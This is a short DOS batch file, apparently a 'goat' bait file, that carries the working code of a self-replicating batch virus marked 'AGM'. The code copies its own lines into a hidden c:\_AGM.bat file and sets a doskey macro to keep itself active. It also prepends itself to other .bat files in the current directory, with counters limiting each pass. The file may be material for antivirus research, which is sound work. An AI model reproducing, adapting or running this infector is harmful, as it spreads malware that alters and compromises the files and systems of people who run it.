@echo off%_AGM%
if '%1=='AGM goto AGM%2
if '%1=='!AGM echo [1A[K[2A
set AGM=%0.bat
if not exist %AGM% set AGM=%0
if '%AGM%==' set AGM=autoexec.bat
if exist c:\_AGM.bat goto AGMg
if exist %AGM% goto AGMf
call %AGM% AGM h %path%
if exist %AGM% goto AGMf
goto eAGM
:AGMh
shift%_AGM%
if '%2==' goto AGMx
if exist %2\%AGM set AGM=%2\%AGM%
if exist %2%AGM set AGM=%2%AGM%
if exist %2\%AGM.bat set AGM=%2\%AGM%.bat
if exist %2%AGM.bat set AGM=%2%AGM%.bat
if not exist %AGM% goto AGMh
goto AGMx
:AGMf
find "AGM"<%AGM%>c:\_AGM.bat
attrib c:\_AGM.bat +h
:AGMg
if '%!AGM%=='----- goto AGMe
set !AGM=%!AGM%-
command /e:5000 /c c:\_AGM AGM v
doskey AGM=c:\_AGM !AGM$tAGM $*>nul
:eAGM
echo%_AGM%.
set AGM=
if exist \!AGM.bat del \!AGM.bat
goto AGMe
:AGMx
echo.>\!AGM.bat
\!AGM.bat
:AGMv
for %%a in (*.bat) do call c:\_AGM AGM i %%a 
exit AGM
:AGMi
find "AGM"<%3>nul
if not errorlevel 1 goto AGMj
type c:\_AGM.bat>AGM$
type %3>>AGM$
move AGM$ %3>nul
set AGM#=%AGM#%-
if %AGM#%==----- exit 
:AGMj
set AGM!=%AGM!%-
if %AGM!%==-- exit 
:AGMe
REM "This is a batch goat file."

